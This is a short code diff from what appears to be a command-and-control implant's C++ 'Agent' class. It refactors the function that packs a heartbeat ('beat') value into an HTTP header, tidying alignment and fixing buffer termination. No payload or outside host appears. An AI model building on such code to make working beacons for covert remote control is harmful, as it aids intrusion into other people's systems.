@@ -88,9 +88,9 @@ LPSTR Agent::BuildBeat()
 
 LPSTR Agent::CreateHeaders()
 {
-	LPSTR beat = this->BuildBeat();
-	ULONG beat_length = StrLenA(beat);
-	ULONG param_length = StrLenA((CHAR*)this->config->parameter);
+	LPSTR beat           = this->BuildBeat();
+	ULONG beat_length    = StrLenA(beat);
+	ULONG param_length   = StrLenA((CHAR*)this->config->parameter);
 	ULONG headers_length = StrLenA((CHAR*)this->config->http_headers);
 
 	CHAR* HttpHeaders = (CHAR*)MemAllocLocal(param_length + beat_length +  headers_length + 5);
@@ -98,10 +98,13 @@ LPSTR Agent::CreateHeaders()
 	ULONG index = headers_length;
 	memcpy(HttpHeaders + index, this->config->parameter, param_length);
 	index += param_length;
-	memcpy(HttpHeaders + index, ": ", 2);
-	index += 2;
+	HttpHeaders[index++] = ':';
+	HttpHeaders[index++] = ' ';
 	memcpy(HttpHeaders + index, beat, beat_length);
 	index += beat_length;
-	memcpy(HttpHeaders + index, "\r\n", 3);
+	HttpHeaders[index++] = '\r';
+	HttpHeaders[index++] = '\n';
+	HttpHeaders[index++] = 0;
+
 	return HttpHeaders;
 }
